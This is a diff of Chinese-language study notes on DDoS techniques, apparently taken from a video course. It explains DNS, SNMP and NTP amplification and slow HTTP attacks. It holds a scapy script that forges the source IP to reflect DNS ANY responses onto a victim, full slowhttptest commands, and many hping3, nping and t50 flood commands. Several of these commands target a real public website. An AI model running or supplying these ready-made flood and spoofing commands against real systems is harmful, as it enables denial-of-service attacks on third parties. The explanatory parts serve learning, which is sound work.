@@ -54,28 +54,81 @@ Application level floods主要是针对应用软件层的
 
 ########################################################################
 
+https://www.bilibili.com/video/BV17E411471J?p=5
+ddos：分布式拒绝服务攻击
 
+dns放大攻击：
+	原理：发送小流量回复大流量
+	步骤：1.伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询
+	      2.dns服务器成为流量发达和实施攻击者，向大量dns服务器请求实现ddos
+snmp放大攻击：
+ntp放大攻击
+
+scapy构造攻击数据包
+	i=IP()
+	i.display()
+	i.dst="202.106.0.20"    #dns服务器
+	u=UDP()
+	u.display()
+	d=DNS()
+	d.display()
+	d.rd=1  			    #dns递归查询
+	d.qdcount=1
+	q=DNSQR()               #定义dns数据包内容
+	q.display()
+	q.qname='qq.com'
+	q.qtype=255
+	q.display()
+	d.qd=q                  #dns协议和数据包结合
+	r=(i/u/d)               #将上面的数据结合起来
+	r.display()
+	sr1(1)                  #将数据包发出
+	i.src='192.168.3.1'     #将源IP修改成攻击目标ip，这样回复数据就会发给目标ip
+	r=(i/u/d)
+	send(r)                 #发包
+
+溢出：频繁使用应用层接口/命令，探测出漏洞
+
+cc：大量频繁攻击消耗系统资源的应用
+慢速攻击：耗尽应用层的并发连接
+	软件：slowhttptest rudy
+	原理：
+		完整的http请求结尾是\r\n\r\n, 攻击发\r\n
+		content-length声明长度，但body部分缓慢发送
+		#GET方式：slowhttptest -c 1000 -H -g -o return.txt -i 10 -r 200 -t GET -u http://192.168.3.1 -x 24 -p 3 -l 99999
+		#POST方式：slowhttptest -c 1000 -B -g -o return.txt -i 110 -r 200 -s 8192 -t FAKEVERB -u http://192.168.3.1 -x 10 -p 3
+slow read attack攻击：慢速攻击的一种，区别是接受的时候耗着
+hulk：随机产生大量唯一的地址路径请求
+
+
+攻击模拟：
 yum -y install libpcap-devel tcl-devel
-git clone https://github.com/antirez/hping.git     #攻击模拟
+git clone https://github.com/antirez/hping.git     
 cd hping  &&  ./configure && make && make install
 netstat -n | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'
+syn flood攻击：
 hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source www.baidu.com
 hping3 -S -P -U -p 80 --flood --rand-source www.baidu.com
+tcp flood攻击：
 hping3 -SARFUP -p 80 --flood --rand-source www.baidu.com
+icmp攻击：
 hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood www.baidu.com
+udp攻击：
 hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood www.baidu.com
+LAND攻击：源地址和目标地址都是攻击者ip
 hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood www.baidu.com
 
 nmap包：
-1.nping --tcp-connect --rate=10000 -c 1000000000 -q www.baidu.com
-2.cat /usr/share/nmap/scripts/script.db
+建立完整连接
+	nping --tcp-connect --rate=10000 -c 1000000000 -q www.baidu.com
+nmap脚本
+cat /usr/share/nmap/scripts/script.db
 	Entry { filename = "broadcast-avahi-dos.nse", categories = { "broadcast", "dos", "intrusive", "vuln", } }
 					脚本名					  种类(后面是具体分类)
 	使用：nmap -p22 --script=脚本名
 
-
+压测：
 siege -i -c 10000 http://192.168.3.128 -A ttt
-
 t50 www.baidu.com --flood --turbo -S --protocol TCP --dport 80
 t50 www.baidu.com --flood --turbo -S TCP UDP OSPF EIGRP --dport 22
 
